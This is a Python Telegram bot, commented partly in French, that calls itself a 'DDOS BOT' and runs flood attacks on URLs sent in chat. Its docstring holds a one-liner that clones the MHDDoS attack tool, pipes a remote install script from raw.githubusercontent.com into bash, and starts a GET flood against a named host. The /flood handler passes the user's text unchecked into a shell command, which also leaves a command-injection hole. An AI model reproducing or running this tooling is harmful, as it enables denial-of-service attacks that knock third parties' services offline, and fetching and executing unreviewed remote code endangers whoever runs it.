"""
/usr/bin/python3 -m pip install --upgrade pip
pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET panpan-bot1.glitch.me 1 100 mhddos_proxy/list 100 5
"""

import requests
import telegram
#from telegram import Update
from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filters
from telegram.update import Update
import re 
import os
import subprocess
import concurrent.futures
import sys


#Telegram token
token = os.getenv('TELEGRAM_TOKEN')
bot_number = os.getenv('NUM')
updater = Updater(token,use_context=True)


def start(update: Update, context: CallbackContext):
  update.message.reply_text(f"DDOS BOT {bot_number}")
  
def flood(update: Update, context: CallbackContext):
  url = update.message.text.replace('/flood', '')
  context.bot.send_message(chat_id=update.effective_chat.id, text="/help")
  command = update.message.text
  args = command.split()[1:]
  url = args[0]
  round = args[1]              
  
  
  
  p = subprocess.Popen(f'python3 flood.py {url} {round}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      ) 
      
      
def stop(update: Update, context: CallbackContext):
  update.message.reply_text("OK je refresh")
  a = subprocess.Popen(f'refresh', stdout=subprocess.PIPE, shell=True)
  output, error = a.communicate()      
      
      

#Trigger des fonctions
updater.dispatcher.add_handler(CommandHandler('flood', flood))
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('stop', stop))

#Run the bot
updater.start_polling()